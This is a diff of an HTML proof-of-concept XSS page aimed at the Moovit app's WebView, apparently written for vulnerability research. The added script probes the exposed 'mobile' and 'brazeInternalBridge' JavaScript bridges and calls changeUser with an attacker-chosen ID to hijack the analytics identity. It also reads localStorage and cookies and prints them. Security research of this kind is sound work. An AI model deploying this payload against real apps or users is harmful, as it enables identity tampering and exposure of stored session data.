@@ -1,30 +1,43 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#1a1a2e;color:#eee;font-family:monospace;padding:30px">
-<h1 style="color:#e94560">&#x26A0; XSS in Moovit WebView</h1>
+<body style="background:#1a1a2e;color:#eee;font-family:monospace;padding:20px;font-size:14px">
+<h2 style="color:#e94560">XSS - Moovit WebView</h2>
 <pre id="out">Probing...</pre>
 <script>
 var out = document.getElementById('out');
 function log(m) { out.innerText += m + '\n'; }
 
-alert('XSS - JS executing in Moovit WebView context!\nOrigin: ' + location.origin);
-
 log('Origin: ' + location.origin);
-log('UA: ' + navigator.userAgent);
+log('UA: ' + navigator.userAgent.substring(0,60));
 
-// Probe mobile JS bridge
-try { mobile.closeWebView(); log('[+] mobile.closeWebView() - ACCESSIBLE'); }
-catch(e) { log('[?] mobile: ' + e); }
+// Probe mobile JS bridge (DO NOT call closeWebView)
+try {
+  var iface = mobile;
+  log('[+] mobile interface: ACCESSIBLE');
+} catch(e) {
+  log('[-] mobile: ' + e);
+}
 
 // Probe brazeInternalBridge
-try { brazeInternalBridge; log('[+] brazeInternalBridge - ACCESSIBLE'); }
-catch(e) { log('[-] brazeInternalBridge: not accessible'); }
+try {
+  var b = brazeInternalBridge;
+  log('[+] brazeInternalBridge: ACCESSIBLE');
+  try {
+    b.changeUser('attacker_id_12345', null);
+    log('[+] brazeInternalBridge.changeUser() - CALLED');
+  } catch(e2) { log('[?] changeUser: ' + e2); }
+} catch(e) {
+  log('[-] brazeInternalBridge: ' + e);
+}
 
 // localStorage
 try { log('[+] localStorage: ' + JSON.stringify(localStorage)); }
 catch(e) { log('[-] localStorage: ' + e); }
 
+// cookies
 log('cookies: ' + (document.cookie || 'none'));
+
+log('--- DONE ---');
 </script>
 </body>
 </html>
